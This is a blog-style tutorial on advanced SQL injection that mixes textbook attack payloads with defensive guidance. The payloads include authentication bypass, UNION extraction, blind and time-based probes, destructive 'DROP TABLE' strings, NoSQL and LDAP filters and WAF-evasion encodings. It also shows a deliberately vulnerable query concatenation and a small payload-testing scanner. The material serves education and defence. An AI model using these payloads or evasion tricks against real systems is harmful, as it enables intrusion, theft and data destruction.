---
title: "SQL Injection: Beyond the Basics"
date: "2025-09-12"
tags: ["SQL Injection", "Web Security", "Pentesting", "OWASP"]
description: "Moving past 'OR 1=1' to explore advanced SQL injection techniques, blind injection methods, and how modern frameworks protect us."
category: "Security"
featured: true
readTime: "12 min read"
---

# SQL Injection: Beyond the Basics

SQL injection remains one of the most critical web application vulnerabilities, consistently ranking in the OWASP Top 10. While most developers know about the classic `' OR 1=1--` example, there's a whole world of advanced techniques that attackers use in the wild.

## The Evolution of SQL Injection

### Classic Injection (Union-based)
The textbook examples we all learned:

```sql
-- Classic authentication bypass
' OR 1=1--

-- Union-based data extraction
' UNION SELECT username, password FROM users--
```

### Blind SQL Injection
When the application doesn't show SQL errors or results directly:

```sql
-- Boolean-based blind injection
' AND (SELECT COUNT(*) FROM users WHERE username='admin') > 0--

-- Time-based blind injection
' AND IF(1=1, SLEEP(5), 0)--
```

## Advanced Techniques

### 1. Second-Order SQL Injection
The payload is stored and executed later in a different context:

```php
// First request - payload stored
INSERT INTO users (username) VALUES ('admin\'; DROP TABLE logs;--')

// Second request - payload executed
SELECT * FROM logs WHERE user = 'admin'; DROP TABLE logs;--'
```

### 2. NoSQL Injection
MongoDB and other NoSQL databases have their own injection vectors:

```javascript
// MongoDB injection example
db.users.find({username: {$ne: null}, password: {$ne: null}})

// Bypasses authentication by finding any user with non-null credentials
```

### 3. LDAP Injection
Often overlooked in enterprise environments:

```ldap
// LDAP filter injection
(&(user=admin)(password=*))

// Bypasses password check
```

## Bypassing Modern Protections

### WAF Evasion Techniques

```sql
-- Case variation
UnIoN SeLeCt

-- Comment insertion
UN/*comment*/ION SE/**/LECT

-- Encoding
%55%4E%49%4F%4E (URL encoded UNION)

-- Alternative whitespace
UNION%0ASELECT (using newline)
```

### Prepared Statement Bypasses
Even prepared statements can be vulnerable:

```java
// Vulnerable even with prepared statements
String columnName = request.getParameter("sort");
String query = "SELECT * FROM users ORDER BY " + columnName;
PreparedStatement ps = connection.prepareStatement(query);
```

## Detection and Prevention

### Code-Level Protection

1. **Parameterized Queries** (Always!)
```sql
-- Correct way
SELECT * FROM users WHERE id = ?
```

2. **Input Validation**
```python
import re

def validate_input(user_input):
    # Whitelist approach
    if re.match("^[a-zA-Z0-9_-]+$", user_input):
        return True
    return False
```

3. **Least Privilege**
```sql
-- Database user should only have necessary permissions
GRANT SELECT ON products TO web_user;
-- Don't grant unnecessary privileges like DROP, ALTER
```

### Detection Tools and Techniques

```bash
# SQLMap - automated SQL injection testing
sqlmap -u "http://target.com/page.php?id=1" --batch --banner

# Manual testing with Burp Suite
# Look for time delays, error messages, behavior changes
```

## Real-World Impact

### Case Study: Recent Attack Chain

1. **Discovery**: Found SQLi in search parameter
2. **Enumeration**: Extracted database schema
3. **Privilege Escalation**: Found admin credentials
4. **Lateral Movement**: Used admin access to compromise other systems

### Business Impact
- **Data Breach**: Customer PII exposed
- **Compliance**: GDPR fines
- **Reputation**: Trust damage
- **Financial**: Incident response costs

## Defense in Depth

### Application Layer
```python
# Django ORM - naturally prevents SQLi
User.objects.filter(username=username)

# But raw queries need care
User.objects.raw("SELECT * FROM users WHERE id = %s", [user_id])
```

### Database Layer
```sql
-- Enable query logging
SET GLOBAL general_log = 'ON';

-- Monitor for suspicious patterns
SELECT * FROM mysql.general_log WHERE argument LIKE '%UNION%';
```

### Network Layer
```bash
# WAF rules (ModSecurity example)
SecRule ARGS "@detectSQLi" \
    "id:1001,\
     phase:2,\
     block,\
     msg:'SQL Injection Attack Detected'"
```

## Testing Your Applications

### Manual Testing Checklist

1. **Input Fields**: Forms, URL parameters, headers
2. **HTTP Methods**: GET, POST, PUT, DELETE
3. **Data Types**: String, numeric, boolean
4. **Special Characters**: `'`, `"`, `;`, `--`, `/*`

### Automated Testing

```python
# Simple SQLi scanner concept
import requests

def test_sql_injection(url, param):
    payloads = [
        "'",
        "' OR 1=1--",
        "'; DROP TABLE users;--"
    ]
    
    for payload in payloads:
        response = requests.get(url, params={param: payload})
        if "error" in response.text.lower():
            print(f"Potential SQLi found with payload: {payload}")
```

## Key Takeaways

1. **SQL injection isn't going away** - it's evolved
2. **Modern frameworks help** but aren't bulletproof
3. **Defense in depth** is essential
4. **Regular testing** should be part of your SDLC
5. **Developer education** is your best investment

## Resources for Further Learning

- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security/sql-injection)
- [SQLMap Documentation](https://sqlmap.org/)

---

*Remember: This information is for educational and defensive purposes only. Always test on systems you own or have explicit permission to test.*
